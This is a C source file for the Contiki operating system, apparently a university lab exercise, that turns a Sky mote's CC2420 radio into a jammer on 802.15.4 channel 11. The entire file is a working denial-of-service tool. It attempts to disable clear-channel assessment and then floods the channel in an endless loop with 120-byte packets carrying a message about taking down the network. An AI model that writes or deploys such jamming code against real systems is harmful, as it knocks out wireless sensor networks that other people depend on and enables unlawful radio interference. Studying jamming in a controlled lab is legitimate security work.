
/**
 * \file
 *         Program for jamming a specific channel
 * \author
 *         Malthe Tøttrup <201907882@post.au.dk>
 * 
 *         $ make TARGET=sky distclean 
 *         $ make TARGET=sky MOTES=/dev/ttyUSB0 jammer.upload login
 */

#include "contiki.h"
#include <stdio.h> /* For printf() */
#include <math.h>
#include <os/dev/radio.h>  
#include "net/nullnet/nullnet.h"
#include "net/netstack.h"
#include <string.h>
#include "sys/log.h"
#include "cc2420.h"

#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO
#define CLOCK_MS CLOCK_SECOND/1000
#define SEND_INTERVAL (2 * CLOCK_MS) //2 ms
#define JAMMER_PACKET_LEN 120

typedef struct{
     char data[JAMMER_PACKET_LEN];
}jpacket_t;

/*---------------------------------------------------------------------------*/
PROCESS(jammer, "jammer process");
AUTOSTART_PROCESSES(&jammer);
/*---------------------------------------------------------------------------*/


PROCESS_THREAD(jammer, ev, data)
{   
    PROCESS_BEGIN();
    printf("Starting jamming attack %d \n", (11 << 1));
    static int channel = 11;
    NETSTACK_RADIO.on();
    //NETSTACK_RADIO.set_value(RADIO_PARAM_CCA_THRESHOLD, 0); //turning CCA off (https://sourceforge.net/p/contiki/mailman/message/34745886/)
    
    //Hopefully this turns CCA off...
    NETSTACK_RADIO.set_value(RADIO_PARAM_TX_MODE, 0);

    //Connect to the desired channel
    if(NETSTACK_RADIO.set_value(RADIO_PARAM_CHANNEL, channel) != RADIO_RESULT_OK) 
    {
        printf("failed channel set");
    }
    cc2420_set_channel(channel);
    
    jpacket_t jpacket;
    memset(&jpacket, 0, sizeof(jpacket_t));
    
    strcpy(jpacket.data, "Antonio Gonga is taking down your network.");

    //static struct etimer et;
    //etimer_set(&et, SEND_INTERVAL);

    while(1) {
        //PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
        //NETSTACK_RADIO.send((void*)&jpacket, JAMMER_PACKET_LEN);
        cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);

        //etimer_reset(&et);
    }

    PROCESS_END();
}
/*---------------------------------------------------------------------------*/
